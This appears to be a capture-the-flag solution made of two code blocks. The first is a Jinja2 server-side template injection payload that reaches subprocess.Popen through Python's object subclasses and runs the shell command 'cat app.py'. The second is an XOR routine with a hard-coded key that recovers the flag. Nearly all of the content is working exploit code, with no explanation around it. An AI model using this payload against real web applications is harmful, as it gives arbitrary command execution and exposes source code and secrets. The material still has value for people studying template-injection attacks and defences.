# Solution

``` python
{{ ''.__class__.__mro__[1].__subclasses__()[407]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
```


``` python
def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))

flag=""
magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747')
```
 
